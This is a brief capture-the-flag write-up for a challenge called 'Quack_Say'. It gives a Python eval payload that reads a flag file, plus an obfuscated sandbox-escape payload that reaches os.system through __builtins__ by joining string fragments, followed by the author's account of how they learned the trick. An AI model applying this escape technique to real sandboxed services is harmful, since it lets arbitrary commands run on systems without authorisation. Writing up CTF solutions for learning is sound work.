# Quack_Say

### 1st part

`open('flag1.txt','r').read()`


### 2nd part
`
__builtins__.__dict__["".join(('__impor','t__'))]("".join(('o','s'))).__dict__["".join(('syste','m'))]('cat flag2.txt')`

##


So the first part was pretty straight forward. I just googled up the work of the `eval` function in python and the job was done.

Now the second part was actually a good one for me. This was my first solve in `pwn category` style challenges. I had been looking up a lot of stuff in google. Found out something called sandboxing in python. So saw a few videos in youtube but that didn't really help much. Then I searched for jailbreak problems in google which straight away hooked me up to a webpage which explained the concept of builitins in python via a similar problem. It took quite a few hours to solve this problem and I am happy that I finally solved this.

[Here](https://anee.me/escaping-python-jails-849c65cf306e) is the link to the website which helped me in this problem 
